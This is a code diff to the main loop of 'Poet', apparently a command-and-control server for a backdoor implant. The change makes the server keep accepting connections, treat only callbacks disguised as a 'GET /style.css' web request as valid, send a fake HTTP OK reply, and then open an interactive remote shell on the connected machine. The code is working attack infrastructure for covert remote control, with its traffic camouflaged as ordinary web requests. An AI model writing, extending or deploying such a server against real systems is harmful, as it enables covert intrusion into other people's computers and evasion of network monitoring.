@@ -405,20 +405,26 @@ def main():
     PORT = int(args.port) if args.port else 443
     s = PoetSocketServer(PORT)
     print '[+] Poet server started on {}.'.format(PORT)
-    conn, addr = s.accept()
-    print '[+] ({}) Connected By: {}'.format(datetime.now(), addr)
-    ping = conn.recv(SIZE)
-    if not ping:
-        raise socket.error('socket connection broken')
-    if ping.startswith('GET /style.css HTTP/1.1'):
-        conn.send(FAKEOK)
-        conn.close()
-        try:
-            PoetServer(s).psh()
-        except socket.error as e:
-            print '[!] ({}) Socket error: {}'.format(datetime.now(), e.message)
-            print '[-] ({}) Poet terminated.'.format(datetime.now())
-            sys.exit(0)
+    while True:
+        conn, addr = s.accept()
+        conntime = datetime.now()
+        ping = conn.recv(SIZE)
+        if not ping:
+            raise socket.error('socket connection broken')
+        if ping.startswith('GET /style.css HTTP/1.1'):
+            print '[+] ({}) Connected By: {} -> VALID'.format(conntime, addr)
+            conn.send(FAKEOK)
+            conn.close()
+            try:
+                PoetServer(s).psh()
+                break
+            except socket.error as e:
+                print '[!] ({}) Socket error: {}'.format(datetime.now(), e.message)
+                print '[-] ({}) Poet terminated.'.format(datetime.now())
+                sys.exit(0)
+        else:
+            print '[!] ({}) Connected By: {} -> INVALID!'.format(conntime, addr)
+            conn.close()
     print '[-] ({}) Poet terminated.'.format(datetime.now())
 
 if __name__ == '__main__':
